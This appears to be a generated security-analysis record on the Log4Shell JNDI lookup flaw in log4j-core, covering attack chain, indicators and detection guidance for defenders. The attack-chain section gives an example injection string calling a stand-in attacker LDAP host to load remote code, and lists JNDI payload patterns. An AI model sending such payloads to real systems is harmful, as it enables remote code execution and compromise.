package_info.why_malicious: The affected versions of log4j-core contain critical vulnerabilities that allow remote code execution (RCE) when processing specially crafted log messages. This is due to unsafe interpolation of user-controlled input in logging patterns, specifically through JNDI lookups, which can be exploited to load and execute code from attacker-controlled servers. Attackers can leverage this to gain full control over vulnerable systems.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by the logging framework
execution_context.file_location: org/apache/logging/log4j/core/lookup/JndiLookup.java (or equivalent class responsible for log message interpolation in log4j-core)
required_permissions: filesystem (if remote code writes to disk or loads classes from file)
environment_vars (if remote code accesses environment variables)
class loading (to dynamically load and execute Java classes)

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the logging framework evaluates the pattern, initiates a JNDI lookup to the specified LDAP server, retrieves a remote Java class reference, and loads and executes the class in the application context, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load executable code from attacker-controlled servers, enabling remote code execution without user interaction.
malice_analysis.violated_expectations: Normal logging frameworks should treat log message content as inert text and must not interpret or execute embedded expressions, nor initiate network requests or load code based on log data. Executing code or performing lookups based on log content is a severe violation of secure logging practices.
malice_analysis.similar_legitimate_use: JNDI lookups may be used legitimately in controlled, internal environments for service discovery or resource location, but should never be exposed to untrusted user input or used in log message interpolation.
key_indicators: Dynamic evaluation of log message content for JNDI patterns
JNDI lookups (LDAP, RMI, DNS, etc.) triggered by log message processing
Outbound network requests to domains specified in log messages
Dynamic loading and execution of Java classes from remote sources
Presence of ${jndi:...} patterns in log files or application input

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application endpoint that is logged by log4j-core.
attack_chain.leads_to: The vulnerable log4j-core library receives and processes the message, triggering evaluation of the JNDI pattern.

attack_chain.action: The log4j-core library evaluates the JNDI pattern and performs a JNDI lookup to the attacker-controlled LDAP server specified in the log message.
attack_chain.leads_to: The application establishes an outbound connection to the attacker's LDAP server, which responds with a reference to a remote Java class.

attack_chain.action: The vulnerable application loads and executes the remote Java class provided by the attacker's LDAP server.
attack_chain.leads_to: Attacker gains remote code execution on the server, potentially allowing full system compromise.

behavioral_signatures: Log message patterns containing ${jndi:ldap://}, ${jndi:rmi://}, ${jndi:dns://}, or similar JNDI expressions
Unexpected outbound LDAP, RMI, or DNS network requests originating from application servers in response to log events
Dynamic code loading or class instantiation triggered by log message content
Presence of JndiLookup usage in log4j-core processing stack traces
file_indicators: Presence of log4j-core versions 2.0-beta9 up to 2.14.1, 2.15.0, 2.16.0, or 2.17.0 in application dependencies (e.g., pom.xml, build.gradle, or dependency trees)
Log files containing suspicious patterns such as ${jndi:ldap://...}, ${jndi:rmi://...}, or ${jndi:dns://...}
References to org/apache/logging/log4j/core/lookup/JndiLookup.class in deployed application artifacts
network_indicators: Outbound LDAP, RMI, or DNS requests to external or untrusted domains immediately following log events
Connections to attacker-controlled infrastructure (e.g., attacker.com) initiated by application servers
Unusual network activity from application servers to ports commonly used by JNDI protocols (e.g., 389/LDAP, 1099/RMI)
detection_knowledge.how_to_detect: Scan application dependencies for vulnerable log4j-core versions using software composition analysis tools. Monitor log files and application input for suspicious patterns such as ${jndi:ldap://}, ${jndi:rmi://}, or ${jndi:dns://}. Detect and alert on unexpected outbound JNDI-related network requests (LDAP, RMI, DNS) from application servers, especially those correlated with log events. Use endpoint monitoring to flag dynamic code loading or execution resulting from log message content. Review stack traces for JndiLookup invocations during log processing.
